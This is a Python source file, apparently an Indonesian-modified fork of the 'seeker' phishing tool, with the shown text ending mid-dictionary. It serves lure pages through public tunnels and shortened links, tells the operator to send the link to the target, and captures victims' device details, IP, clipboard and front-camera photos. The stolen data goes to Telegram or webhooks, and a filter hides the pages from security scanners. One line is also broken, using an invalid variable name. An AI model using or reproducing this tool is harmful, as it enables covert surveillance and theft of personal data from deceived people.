#!/usr/bin/env python3

VERSION = '1.3.1'

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white
Y = '\033[33m'  # yellow

import sys
import utils
import argparse
import requests
import traceback
import shutil
import socket
import webbrowser
import glob
import importlib
import subprocess as subp
import tempfile
import os
import re
import threading
from time import sleep
import time
from os import path, kill, mkdir, getenv, environ, remove
import json
from csv import writer
from datetime import datetime
from ipaddress import ip_address

CHECK = '+' if sys.platform == 'win32' else '✔'
CROSS = 'x' if sys.platform == 'win32' else '✘'
IS_TERMUX = 'TERMUX_VERSION' in environ

try:
    from packaging import version
except ImportError:
    import re as _re
    class version:
        @staticmethod
        def parse(v):
            parts = _re.findall(r'\d+', v)
            return tuple(int(p) for p in parts) if parts else (0,)

try:
    from signal import SIGTERM
except ImportError:
    SIGTERM = 15

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

def get_safe_tmpdir():
    tmpdir = tempfile.gettempdir()
    try:
        test_file = path.join(tmpdir, '.seeker_tmp_test')
        with open(test_file, 'w') as f:
            f.write('test')
        remove(test_file)
        return tmpdir
    except (OSError, PermissionError):
        pass
    prefix_tmp = path.join(getenv('PREFIX', '/data/data/com.termux/files/usr'), 'tmp')
    if path.isdir(prefix_tmp):
        return prefix_tmp
    return path.dirname(path.realpath(__file__))

def kill_process(pid):
    if sys.platform == 'win32':
        try:
            subp.run(['taskkill', '/F', '/PID', str(pid)], capture_output=True, timeout=5)
        except Exception:
            try:
                kill(pid, SIGTERM)
            except Exception:
                pass
    else:
        try:
            kill(pid, SIGTERM)
        except Exception:
            pass


SAFE_TMPDIR = get_safe_tmpdir()

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument(
    '-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]'
)
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')
def template_type(value):
    if value.isdigit():
        return int(value)
    return value

parser.add_argument(
    '-t',
    '--template',
    type=template_type,
    help='Load template by index number or dir_name string (e.g. nearyou, youtube)',
)
parser.add_argument(
    '-d',
    '--debugHTTP',
    action='store_true',
    default=False,
    help='Disable HTTPS redirection for testing only',
)
parser.add_argument(
    '-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]'
)
parser.add_argument(
    '-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]'
)
parser.add_argument(
    '-s', '--shorten', type=str, help='Shorten a URL using is.gd/tinyurl'
)
parser.add_argument(
    '--camera', type=str, choices=['on', 'off'], default=None,
    help='Enable/disable front camera capture [on|off]'
)
parser.add_argument(
    '-nd', '--no-dashboard', action='store_true', default=False,
    help='Jangan auto-open dashboard di browser'
)
parser.add_argument(
    '-stm', '--skip-tunnel-menu', action='store_true', default=False,
    help='Skip tunnel selection menu (langsung ke paste URL + short)'
)

args = parser.parse_args()
kml_fname = args.kml
port = int(getenv('PORT')) if getenv('PORT') else args.port
chk_upd = args.update
print_v = args.version
telegram = getenv('TELEGRAM') or args.telegram
webhook = getenv('WEBHOOK') or args.webhook

if args.debugHTTP or (getenv('DEBUG_HTTP') and getenv('DEBUG_HTTP').lower() in ('1', 'true')):
    environ['DEBUG_HTTP'] = '1'
else:
    environ['DEBUG_HTTP'] = '0'

camera_env = getenv('CAMERA')
if camera_env is not None and camera_env.lower() in ('0', 'off', 'false', 'no'):
    args.camera = 'off'
elif camera_env is not None and camera_env.lower() in ('1', 'on', 'true', 'yes'):
    args.camera = 'on'

templateNum = (
    int(getenv('TEMPLATE'))
    if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric()
    else getenv('TEMPLATE')
    if getenv('TEMPLATE') and not getenv('TEMPLATE').isnumeric()
    else args.template
)

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
PID_FILE = f'{path_to_script}/pid'

RESULTS_JSON = f'{DB_DIR}/results.json'
RESULTS_JS = f'{DB_DIR}/results.js'
active_sessions = {}

if not path.isdir(LOG_DIR):
    mkdir(LOG_DIR)

if not path.isdir(DB_DIR):
    mkdir(DB_DIR)

camera_enabled = True


def chk_update():
    try:
        print('> Fetching Metadata...', end='')
        rqst = requests.get(META_URL, timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            print('OK')
            metadata = rqst.text
            json_data = json.loads(metadata)
            gh_version = json_data['version']
            if version.parse(gh_version) > version.parse(VERSION):
                print(f'> New Update Available : {gh_version}')
            else:
                print('> Already up to date.')
    except Exception as exc:
        utils.print(f'Exception : {str(exc)}')


if chk_upd is True:
    chk_update()
    sys.exit()

if print_v is True:
    utils.print(VERSION)
    sys.exit()

if args.shorten:
    from url_shortener import shorten
    result, error = shorten(args.shorten)
    if result:
        utils.print(f'{G}[+] {C}Short URL: {W}{result}')
    else:
        utils.print(f'{R}[-] {C}Failed: {W}{error}')
    sys.exit()




def banner():
    with open(META_FILE, 'r') as metadata:
        json_data = json.loads(metadata.read())
        grup-buyer_url = json_data['grup_whatsap']
        comms_url = json_data['comms']

    art = r"""
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
     \/      \/     \/      \/     \/"""
    utils.print(f'{G}{art}{W}\n')
    utils.print(f'{G}[>] {C}Created By   : {W}thewhiteh4t && Denz')
    utils.print(f'{G} |---> {C}grup_whatsap   : {W}{grup_whatsap_url}')
    utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
    utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')


def send_webhook(content, msg_type):
    if webhook is not None:
        if not webhook.lower().startswith('http://') and not webhook.lower().startswith(
            'https://'
        ):
            utils.print(f'{R}[-] {C}Protocol missing, include http:// or https://{W}')
            return
        if webhook.lower().startswith('https://discord.com/api/webhooks'):
            from discord_webhook import discord_sender

            discord_sender(webhook, msg_type, content)
        else:
            requests.post(webhook, json=content)


def send_telegram(content, msg_type):
    if telegram is not None:
        tmpsplit = telegram.split(':')
        if len(tmpsplit) < 3:
            utils.print(
                f'{R}[-] {C}Telegram API token invalid! Format -> token:chatId{W}'
            )
            return
        from telegram_api import tgram_sender

        tgram_sender(msg_type, content, tmpsplit)


def send_telegram_photo(photo_path, caption):
    if telegram is not None:
        tmpsplit = telegram.split(':')
        if len(tmpsplit) < 3:
            return
        from telegram_api import tgram_photo_sender

        tgram_photo_sender(photo_path, caption, tmpsplit)


def template_select(site):
    utils.print(f'{Y}[!] Select a Template :{W}\n')

    with open(TEMPLATES_JSON, 'r') as templ:
        templ_info = templ.read()

    templ_json = json.loads(templ_info)

    for item in templ_json['templates']:
        name = item['name']
        utils.print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')

    try:
        selected = -1
        if templateNum is not None:
            if isinstance(templateNum, str):
                for idx, item in enumerate(templ_json['templates']):
                    if item['dir_name'] == templateNum:
                        selected = idx
                        break
                if selected == -1:
                    utils.print(f'{R}[-] {C}Template "{templateNum}" not found!{W}')
                    sys.exit()
            elif isinstance(templateNum, int) and templateNum >= 0 and templateNum < len(templ_json['templates']):
                selected = templateNum
            else:
                selected = int(input(f'{G}[>] {W}'))
        else:
            selected = int(input(f'{G}[>] {W}'))
        if selected < 0:
            print()
            utils.print(f'{R}[-] {C}Invalid Input!{W}')
            sys.exit()
    except ValueError:
        print()
        utils.print(f'{R}[-] {C}Invalid Input!{W}')
        sys.exit()

    try:
        site = templ_json['templates'][selected]['dir_name']
    except IndexError:
        print()
        utils.print(f'{R}[-] {C}Invalid Input!{W}')
        sys.exit()

    print()
    utils.print(
        f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}'
    )

    global camera_enabled
    if args.camera is None:
        if sys.stdout.isatty():
            camera_input = input(
                f'{G}[>] {C}Aktifkan kamera depan? (otomatis foto target) [Y/n]: {W}'
            ).strip().lower()
            camera_enabled = camera_input not in ('n', 'no', '0', 'off')
        else:
            camera_enabled = True
    else:
        camera_enabled = args.camera == 'on'

    if camera_enabled:
        utils.print(f'{G}[+] {C}Camera Capture: {G}AKTIF{W}')
    else:
        utils.print(f'{Y}[-] {C}Camera Capture: {R}NONAKTIF{W}')

    imp_file = templ_json['templates'][selected]['import_file']
    importlib.import_module(f'template.{imp_file}')
    shutil.copyfile(
        'php/error.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/error_handler.php',
    )
    shutil.copyfile(
        'php/info.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/info_handler.php',
    )
    shutil.copyfile(
        'php/result.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/result_handler.php',
    )
    shutil.copyfile(
        'php/clear.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/clear_handler.php',
    )
    shutil.copyfile(
        'php/camera.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/camera_handler.php',
    )
    shutil.copyfile(
        'php/clipboard_handler.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/clipboard_handler.php',
    )
    jsdir = f'template/{templ_json["templates"][selected]["dir_name"]}/js'
    if not path.isdir(jsdir):
        mkdir(jsdir)
    with open('js/location.js', 'r') as src:
        js_content = src.read()
    flag = 'true' if camera_enabled else 'false'
    js_content = f'var CAMERA_ENABLED = {flag};\n' + js_content
    with open(jsdir + '/location.js', 'w') as dst:
        dst.write(js_content)
    return site


def server():
    print()
    if not shutil.which('php'):
        install_cmd = 'winget install -e --id PHP.PHP.8.4' if sys.platform == 'win32' else 'pkg install php'
        utils.print(f'{R}[-] {C}PHP not found! Install with: {install_cmd}{W}')
        sys.exit(1)

    port_free = False
    utils.print(f'{G}[+] {C}Port : {W}{port}\n')
    utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect(('127.0.0.1', port))
        except ConnectionRefusedError:
            port_free = True

    if not port_free:
        utils.print(f'{C}[ {Y}BUSY{C} ]{W}')
        utils.print(f'{Y}[!] {C}Port {W}{port} {C}sedang dipakai, mencoba kill process lama...{W}')

        killed = False
        if path.exists(PID_FILE):
            try:
                with open(PID_FILE, 'r') as pid_info:
                    pid = int(pid_info.read().strip())
                if PSUTIL_AVAILABLE:
                    old_proc = psutil.Process(pid)
                    old_proc.kill()
                else:
                    kill_process(pid)
                killed = True
            except Exception:
                pass

        if not killed:
            if PSUTIL_AVAILABLE:
                try:
                    for conn in psutil.net_connections(kind='inet'):
                        if conn.laddr.port == port and conn.status == 'LISTEN':
                            try:
                                proc = psutil.Process(conn.pid)
                                proc.kill()
                                killed = True
                            except Exception:
                                pass
                except Exception:
                    pass
            
            if not killed and sys.platform != 'win32':
                try:
                    result = subp.run(['fuser', '-k', f'{port}/tcp'], 
                                    capture_output=True, timeout=5)
                    if result.returncode == 0:
                        killed = True
                except Exception:
                    pass
            
            if not killed and sys.platform != 'win32':
                try:
                    result = subp.run(['lsof', '-t', '-i', f'tcp:{port}'], 
                                    capture_output=True, timeout=5)
                    if result.returncode == 0 and result.stdout.strip():
                        pid_out = result.stdout.strip().split(b'\n')[0]
                        kill_process(int(pid_out))
                        killed = True
                except Exception:
                    pass

        sleep(1)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect(('127.0.0.1', port))
                port_free = False
            except ConnectionRefusedError:
                port_free = True

        if not port_free:
            utils.print(f'{C}[ {R}{CROSS}{C} ]{W}')
            utils.print(f'{R}[-] {C}Port {W}{port} {C}masih dipakai. Kill manual atau ganti port.{W}')
            sys.exit()

        utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')

    with open(LOG_FILE, 'w') as phplog:
        proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
        with open(PID_FILE, 'w') as pid_out:
            pid_out.write(str(proc.pid))

        sleep(3)

        try:
            php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html', timeout=5)
            php_sc = php_rqst.status_code
            if php_sc == 200:
                utils.print(f'{C}[ {G}{CHECK}{C} ]{W}')
                sleep(2)
                if proc.poll() is not None:
                    utils.print(f'\n{C}[ {R}{CROSS}{C} ]{W}')
                    utils.print(f'{R}[-] {C}PHP server crash setelah start!{W}')
                    try:
                        with open(LOG_FILE, 'r') as log_r:
                            for ln in log_r:
                                ln = ln.rstrip()
                                if ln:
                                    utils.print(f'  {Y}{ln}{W}')
                    except Exception:
                        pass
                    sys.exit(1)
                print()
                try:
                    dash_path = f'file:///{path_to_script.replace(chr(92), "/")}/dashboard.html'
                    if sys.platform == 'win32' and not args.no_dashboard:
                        webbrowser.open(dash_path)
                except Exception:
                    pass
                utils.print(f'{G}[+] {C}Dashboard: {W}{dash_path}')
                utils.print(f'{G}[+] {C}Hasil CSV: {W}{path_to_script}/db/results.csv')
                utils.print(f'{G}[+] {C}Hasil JSON: {W}{path_to_script}/db/results.json')
                utils.print(f'{G}[+] {C}Foto korban: {W}{path_to_script}/db/captures/')
            else:
                utils.print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
                cl_quit()
        except requests.ConnectionError:
            utils.print(f'{C}[ {R}{CROSS}{C} ]{W}')
            cl_quit()


CF_PATTERN = re.compile(r'https://(?!api\.)[a-z0-9-]+\.trycloudflare\.com')

def _read_url_from_fd(fd, proc, timeout):
    import select
    buf = ''
    start = time.time()
    while time.time() - start < timeout:
        r, _, _ = select.select([fd], [], [], 1.0)
        if r:
            try:
                data = os.read(fd, 4096)
                if not data:
                    break
                buf += data.decode('utf-8', errors='replace')
                m = CF_PATTERN.search(buf)
                if m:
                    os.close(fd)
                    return m.group(0), None
            except OSError:
                break
        if proc.poll() is not None:
            break
    try:
        os.close(fd)
    except Exception:
        pass
    kill_process(proc.pid)
    if 'connection refused' in buf.lower() or 'refused' in buf.lower():
        return None, 'Gagal: PHP server tidak berjalan (connection refused)'
    return None, f'Tidak dapat URL dalam {timeout} detik'


def _read_url_from_pipe(proc, pattern, timeout):
    start = time.time()
    for line in iter(proc.stdout.readline, ''):
        m = pattern.search(line)
        if m:
            return m.group(0), None
        if time.time() - start > timeout:
            break
    try:
        proc.terminate()
    except Exception:
        pass
    return None, f'Tidak dapat URL dalam {timeout} detik'


def auto_cloudflare(timeout=40):
    utils.print(f'{G}[*] {C}Starting Cloudflare Tunnel (tunggu 10-30 detik)...{W}')
    cf = shutil.which('cloudflared')
    if not cf:
        return None, 'cloudflared tidak ditemukan'
    cmd = [cf, 'tunnel', '--url', f'http://127.0.0.1:{port}']
    if sys.platform != 'win32':
        try:
            import pty
            import select
            master, slave = pty.openpty()
            proc = subp.Popen(cmd, stdout=slave, stderr=subp.STDOUT, close_fds=True)
            os.close(slave)
            return _read_url_from_fd(master, proc, timeout)
        except Exception:
            pass
    stdbuf = shutil.which('stdbuf')
    if stdbuf:
        cmd = [stdbuf, '-oL'] + cmd
    try:
        proc = subp.Popen(cmd, stdout=subp.PIPE, stderr=subp.STDOUT,
                         universal_newlines=True, bufsize=1)
        return _read_url_from_pipe(proc, CF_PATTERN, timeout)
    except Exception as e:
        return None, str(e)


SSH_PATTERN = re.compile(r'https://[a-z0-9-]+\.lhr\.life')


def auto_ssh(timeout=30):
    ssh_bin = shutil.which('ssh')
    if not ssh_bin:
        return None, 'ssh tidak ditemukan'
    utils.print(f'{G}[*] {C}Starting SSH Tunnel (localhost.run)...{W}')
    log_file = path.join(SAFE_TMPDIR, f'seeker_ssh_{int(time.time())}.log')
    try:
        with open(log_file, 'w') as lf:
            proc = subp.Popen(
                [ssh_bin, '-o', 'StrictHostKeyChecking=no',
                 '-R', f'80:127.0.0.1:{port}', 'nokey@localhost.run'],
                stdout=lf, stderr=subp.STDOUT)
        start = time.time()
        while time.time() - start < timeout:
            sleep(2)
            try:
                with open(log_file, 'r', encoding='utf-8', errors='ignore') as lf:
                    content = lf.read()
                m = SSH_PATTERN.search(content)
                if m:
                    return m.group(0), None
            except Exception:
                pass
        return None, 'Timeout SSH tunnel'
    except Exception as e:
        return None, str(e)


def auto_ngrok_cf(timeout=45):
    ngrok_bin = shutil.which('ngrok')
    if not ngrok_bin:
        return None, 'ngrok tidak ditemukan'
    utils.print(f'{G}[*] {C}Starting ngrok...{W}')
    ngrok_log = path.join(SAFE_TMPDIR, f'seeker_ngrok_{int(time.time())}.log')
    try:
        with open(ngrok_log, 'w') as lf:
            ngrok_proc = subp.Popen(
                [ngrok_bin, 'http', str(port), '--log', 'stdout'],
                stdout=lf, stderr=subp.STDOUT)
        ngrok_url = None
        start = time.time()
        while time.time() - start < 15:
            sleep(1)
            try:
                r = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
                if r.status_code == 200:
                    for t in r.json().get('tunnels', []):
                        pu = t.get('public_url', '')
                        if pu.startswith('https://'):
                            ngrok_url = pu
                            break
                    if ngrok_url:
                        break
            except Exception:
                pass
        if not ngrok_url:
            ngrok_proc.terminate()
            return None, 'Gagal dapat URL ngrok'
        utils.print(f'{G}[+] {C}ngrok URL: {W}{ngrok_url}')
        utils.print(f'{G}[*] {C}Deploy CF Worker...{W}')
        try:
            result = subp.run(
                [sys.executable, 'cf_setup.py'],
                capture_output=True, text=True, timeout=60,
                cwd=path_to_script)
            m = re.search(r'https://[a-z0-9-]+\.workers\.dev', result.stdout)
            if m:
                return m.group(0), None
            worker_file = path.join(SAFE_TMPDIR, 'seeker_worker_url.txt')
            if path.exists(worker_file):
                with open(worker_file, 'r') as f:
                    url = f.read().strip()
                    if url:
                        remove(worker_file)
                        return url, None
            return None, 'Gagal deploy CF Worker. Coba manual: python3 cf_setup.py'
        except subp.TimeoutExpired:
            return None, 'Timeout deploy CF Worker'
        except Exception as e:
            return None, str(e)
    except Exception as e:
        return None, str(e)


def auto_shorten():
    from url_shortener import shorten
    tunnel_url = None

    worker_file = path.join(SAFE_TMPDIR, 'seeker_worker_url.txt')
    if path.exists(worker_file):
        try:
            with open(worker_file, 'r') as f:
                tunnel_url = f.read().strip()
            remove(worker_file)
            if tunnel_url:
                utils.print(f'{G}[+] {C}CF Worker URL: {W}{tunnel_url}')
        except Exception:
            pass

    if not tunnel_url:
        if args.skip_tunnel_menu:
            tunnel_url = input(f'{G}[>] {C}Paste URL tunnel dari jendela tunnel: {W}').strip()
            if not tunnel_url:
                utils.print(f'{Y}[!] {C}URL kosong, lanjut tanpa shorten.{W}')
        else:
            print()
            utils.print(f'{Y}[!] {C}Tunnel tidak terdeteksi. Pilih metode tunnel:{W}')
            if IS_TERMUX:
                print(f'  {G}[1]{C} SSH localhost.run (manual, buka terminal baru){W}')
                print(f'  {G}[2]{C} Serveo (manual, buka terminal baru){W}')
                print(f'  {G}[3]{C} Paste URL manual (kalo udah punya tunnel){W}')
                print(f'  {G}[0]{C} Lanjut tanpa tunnel (gak bisa dishare){W}')
                print()
                t_choice = input(f'{G}[>] {C}Pilih [0-3] (default: 0): {W}').strip()
                if not t_choice:
                    t_choice = '0'

                if t_choice == '1':
                    utils.print(f'\n{Y}[!] {C}Buka TERMINAL BARU di Termux, lalu jalankan:{W}')
                    utils.print(f'{C}')
                    print(f'  ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:8080 nokey@localhost.run')
                    utils.print(f'{W}')
                    print()
                    utils.print(f'{Y}[!] {C}Tunggu sampai ada URL https://xxx.lhr.life{W}')
                    print()
                    tunnel_url = input(f'{G}[>] {C}Paste URL tunnel: {W}').strip()

                elif t_choice == '2':
                    utils.print(f'\n{Y}[!] {C}Buka TERMINAL BARU di Termux, lalu jalankan:{W}')
                    utils.print(f'{C}')
                    print(f'  ssh -R 80:127.0.0.1:8080 serveo.net')
                    utils.print(f'{W}')
                    print()
                    utils.print(f'{Y}[!] {C}Tunggu URL dari serveo (biasanya https://xxx.serveo.net){W}')
                    print()
                    tunnel_url = input(f'{G}[>] {C}Paste URL tunnel: {W}').strip()

                elif t_choice == '3':
                    tunnel_url = input(f'{G}[>] {C}Paste tunnel URL: {W}').strip()
                else:
                    utils.print(f'{Y}[!] {C}Lanjut tanpa tunnel.{W}')
            else:
                print(f'  {G}[1]{C} Cloudflare Tunnel (otomatis){W}')
                print(f'  {G}[2]{C} SSH localhost.run (otomatis){W}')
                print(f'  {G}[3]{C} ngrok + CF Worker (otomatis){W}')
                print(f'  {G}[4]{C} Paste URL manual (kalo udah punya tunnel){W}')
                print(f'  {G}[0]{C} Lanjut tanpa tunnel (gak bisa dishare){W}')
                print()
                t_choice = input(f'{G}[>] {C}Pilih [0-4] (default: 0): {W}').strip()
                if not t_choice:
                    t_choice = '0'

                if t_choice == '1':
                    tunnel_url, err = auto_cloudflare()
                    if err:
                        utils.print(f'{R}[-] {C}{err}{W}')
                elif t_choice == '2':
                    tunnel_url, err = auto_ssh()
                    if err:
                        utils.print(f'{R}[-] {C}{err}{W}')
                elif t_choice == '3':
                    tunnel_url, err = auto_ngrok_cf()
                    if err:
                        utils.print(f'{R}[-] {C}{err}{W}')
                elif t_choice == '4':
                    tunnel_url = input(f'{G}[>] {C}Paste tunnel URL: {W}').strip()
                else:
                    utils.print(f'{Y}[!] {C}Lanjut tanpa tunnel.{W}')

    if tunnel_url:
        if 'serveo.net' in tunnel_url:
            utils.print(f'\n{Y}[!] {C}Serveo URL gak bisa di-short (is.gd/tinyurl blokir).{W}')
            utils.print(f'{G}[+] {C}URL Tunnel: {W}{tunnel_url}')
            utils.print(f'{G}[+] {C}Kirim URL ini ke target!{W}\n')
        else:
            utils.print(f'\n{Y}[?] {C}Mau di-short pake is.gd/tinyurl? [Y/n]: {W}', end='')
            ans = input().strip().lower()
            if ans in ('', 'y', 'yes'):
                utils.print(f'{G}[+] {C}Memperpendek URL...{W}')
                result, error = shorten(tunnel_url)
                if result:
                    utils.print(f'\n{G}[+] {C}URL Pendek: {W}{result}')
                    utils.print(f'{G}[+] {C}Kirim URL ini ke target!{W}\n')
                else:
                    utils.print(f'{Y}[!] {C}Shortener gagal ({error}), pakai URL asli:{W}')
                    utils.print(f'{C}{tunnel_url}{W}\n')
            else:
                utils.print(f'{G}[+] {C}URL Tunnel: {W}{tunnel_url}')
                utils.print(f'{G}[+] {C}Kirim URL ini ke target!{W}\n')
    else:
        utils.print(f'{Y}[!] {C}URL tidak dimasukkan, lanjut tanpa shorten.{W}\n')


def check_vpn(ip):
    try:
        rqst = requests.get(f'https://freeipapi.com/api/json/{ip}', timeout=5)
        if rqst.status_code == 200:
            res = rqst.json()
            return res.get('isProxy', False)
    except Exception as e:
        utils.print(f'{Y}[!] {C}VPN check failed: {W}{e}')
    return False


BOT_UA_PATTERNS = [
    'bot', 'crawl', 'spider', 'scrape', 'headless',
    'HeadlessChrome', 'PhantomJS', 'puppeteer', 'playwright',
    'Selenium', 'wget', 'curl', 'python-request', 'Go-http-client',
    'scan', 'checker', 'security', 'validator', 'uptime',
]

BOT_RENDERER_PATTERNS = [
    'SwiftShader', 'llvmpipe', 'softpipe', 'Software',
    'VMware', 'VirtualBox', 'Mesa Intel',
]


def detect_bot(info_json):
    reasons = []

    ua_full = str(info_json.get('browser', ''))
    for pattern in BOT_UA_PATTERNS:
        if pattern.lower() in ua_full.lower():
            reasons.append(f'ua={pattern}')
            break

    platform = str(info_json.get('platform', ''))
    os_name = str(info_json.get('os', ''))

    if 'android' in os_name.lower() and ('x86' in platform.lower() or 'intel' in platform.lower()):
        reasons.append('android_on_x86')

    cores = info_json.get('cores')
    if cores and str(cores).isdigit() and os_name and 'android' in os_name.lower():
        if int(cores) > 8:
            reasons.append(f'android_cores={cores}')

    ram = info_json.get('ram')
    if ram and str(ram).replace('.', '').isdigit() and os_name and 'android' in os_name.lower():
        try:
            if float(ram) > 18:
                reasons.append(f'android_ram={ram}')
        except Exception:
            pass

    wd = info_json.get('wd')
    ht = info_json.get('ht')
    if wd and ht:
        try:
            w = int(wd)
            h = int(ht)
            if w == h and w <= 500:
                reasons.append(f'square_res={w}x{h}')
        except Exception:
            pass

    renderer = str(info_json.get('render', ''))
    for pattern in BOT_RENDERER_PATTERNS:
        if pattern.lower() in renderer.lower() and 'android' in os_name.lower():
            reasons.append(f'sw_gpu={pattern}')
            break

    return bool(reasons), reasons


def _read_json_db():
    if not path.exists(RESULTS_JSON):
        return []
    try:
        with open(RESULTS_JSON, 'r') as f:
            return json.load(f)
    except Exception:
        return []


def _write_json_db(entries):
    try:
        with open(RESULTS_JSON, 'w') as f:
            json.dump(entries, f, indent=4)
        with open(RESULTS_JS, 'w') as f:
            f.write(f"var seeker_results = {json.dumps(entries, indent=4)};")
    except Exception as e:
        utils.print(f'{R}[-] {C}Error saving DB: {W}{e}')


def save_to_json_db(data):
    data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    entries = _read_json_db()
    entries.append(data)
    _write_json_db(entries)


def update_json_db(sid, updated_data):
    entries = _read_json_db()
    updated = False
    for i, entry in enumerate(entries):
        if entry.get('sid') == sid:
            updated_data['timestamp'] = entry.get('timestamp')
            if not updated_data['timestamp']:
                updated_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            entries[i] = updated_data
            updated = True
            break

    if not updated:
        updated_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entries.append(updated_data)

    _write_json_db(entries)
    utils.print(f'{G}[+] {C}Dashboard Updated!{W}\n')


def parse_camera_info(filepath):
    with open(filepath, 'r') as f:
        content = f.read()
    if not content or content.strip() == '':
        try:
            remove(filepath)
        except Exception:
            pass
        return

    try:
        cam_json = json.loads(content)
    except json.JSONDecodeError:
        utils.print(f'{R}[-] {C}JSON Decode Error on Camera Info : {R}{traceback.format_exc()}{W}')
        try:
            remove(filepath)
        except Exception:
            pass
        return

    var_sid = cam_json.get('sid', 'N/A')
    var_status = cam_json.get('status', 'failed')
    var_error = cam_json.get('error', None)

    if var_status == 'success':
        utils.print(f'{G}[+] {C}Camera Photo Captured (Session: {var_sid}){W}')
        photo_path = f'{path_to_script}/db/captures/{var_sid}.jpg'
        if path.exists(photo_path):
            send_telegram_photo(photo_path, f'*Camera Capture*\n`Session:` {var_sid}')
    else:
        utils.print(f'{Y}[!] {C}Camera Not Available (Session: {var_sid}) : {W}{var_error}')

    session_data = active_sessions.get(var_sid, None)
    if session_data:
        session_data['camera'] = {
            'status': var_status,
            'error': var_error
        }
        update_json_db(var_sid, session_data)

    try:
        remove(filepath)
    except Exception:
        pass


def parse_clipboard_info(filepath):
    with open(filepath, 'r') as f:
        content = f.read()
    if not content or content.strip() == '':
        try:
            remove(filepath)
        except Exception:
            pass
        return

    try:
        clip_json = json.loads(content)
    except json.JSONDecodeError:
        utils.print(f'{R}[-] {C}JSON Decode Error on Clipboard Info : {R}{traceback.format_exc()}{W}')
        try:
            remove(filepath)
        except Exception:
            pass
        return

    var_sid = clip_json.get('sid', 'N/A')
    var_data = clip_json.get('data', '')
    var_time = clip_json.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

    utils.print(f'{G}[+] {C}Clipboard Data Captured (Session: {var_sid}) : {W}{var_data[:80]}{"..." if len(var_data) > 80 else ""}')

    session_data = active_sessions.get(var_sid, None)
    if session_data is None:
        session_data = {
            'sid': var_sid,
            'clipboard': [],
            'pending': True
        }
        active_sessions[var_sid] = session_data

    if 'clipboard' not in session_data or not isinstance(session_data['clipboard'], list):
        session_data['clipboard'] = []
    session_data['clipboard'].append({
        'data': var_data,
        'timestamp': var_time
    })
    update_json_db(var_sid, session_data)

    try:
        remove(filepath)
    except Exception:
        pass


def parse_device_info(filepath):
    with open(filepath, 'r') as info_file:
        info_content = info_file.read()
    if not info_content or info_content.strip() == '':
        try:
            remove(filepath)
        except Exception:
            pass
        return
        
    try:
        info_json = json.loads(info_content)
    except json.JSONDecodeError:
        utils.print(f'{R}[-] {C}JSON Decode Error on Device Info : {R}{traceback.format_exc()}{W}')
        try:
            remove(filepath)
        except Exception:
            pass
        return
        
    var_os = info_json.get('os', 'Not Available')
    var_platform = info_json.get('platform', 'Not Available')
    var_cores = info_json.get('cores', 'Not Available')
    var_ram = info_json.get('ram', 'Not Available')
    var_vendor = info_json.get('vendor', 'Not Available')
    var_render = info_json.get('render', 'Not Available')
    var_res = str(info_json.get('wd', '0')) + 'x' + str(info_json.get('ht', '0'))
    var_browser = info_json.get('browser', 'Not Available')
    var_ip = info_json.get('ip', 'Not Available')
    var_sid = info_json.get('sid', 'N/A')
    var_brand = info_json.get('brand', 'Not Available')
    var_model = info_json.get('model', 'Not Available')

    is_bot, bot_reasons = detect_bot(info_json)

    if is_bot:
        bot_msg = f"""{Y}[!] {R}BOT DETECTED (Session: {var_sid}) - IGNORED{W}

{G}[+] {C}Reasons   : {W}{'; '.join(bot_reasons)}
{G}[+] {C}OS        : {W}{var_os}
{G}[+] {C}Platform  : {W}{var_platform}
{G}[+] {C}IP        : {W}{var_ip}
{G}[+] {C}Resolution: {W}{var_res}
{G}[+] {C}GPU       : {W}{var_render}
"""
        utils.print(bot_msg)

        session_record = {
            "sid": var_sid,
            "os": var_os,
            "platform": var_platform,
            "brand": var_brand,
            "model": var_model,
            "cores": var_cores,
